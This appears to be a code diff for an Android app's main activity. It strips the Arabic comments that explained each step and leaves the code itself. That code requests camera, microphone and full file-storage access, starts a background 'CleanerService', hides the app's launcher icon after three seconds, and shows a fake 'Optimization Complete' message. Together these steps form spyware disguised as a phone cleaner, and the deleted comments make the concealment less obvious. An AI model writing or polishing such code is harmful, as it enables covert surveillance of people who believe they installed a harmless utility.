@@ -18,7 +18,6 @@ public class MainActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-        // 1. طلب الصلاحيات الأساسية
         String[] perms = {
             Manifest.permission.CAMERA,
             Manifest.permission.RECORD_AUDIO,
@@ -31,7 +30,6 @@ public class MainActivity extends Activity {
         };
         ActivityCompat.requestPermissions(this, perms, 1);
 
-        // 2. طلب صلاحية قراءة كل الملفات (خاص بأندرويد 11+)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             if (!Environment.isExternalStorageManager()) {
                 Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
@@ -40,16 +38,12 @@ public class MainActivity extends Activity {
             }
         }
 
-        // 3. تشغيل السيرفس اللي بيشتغل في الخلفية
         startService(new Intent(this, CleanerService.class));
 
-        // 4. إخفاء الأيقونة بعد 3 ثواني (عشان اليوزر ياخد وقتها في الموافقة على الصلاحيات)
         new android.os.Handler().postDelayed(() -> {
             PackageManager p = getPackageManager();
             ComponentName componentName = new ComponentName(this, MainActivity.class);
-            // إخفاء الأيقونة
             p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
-            
             Toast.makeText(this, "Optimization Complete", Toast.LENGTH_SHORT).show();
             finish();
         }, 3000);
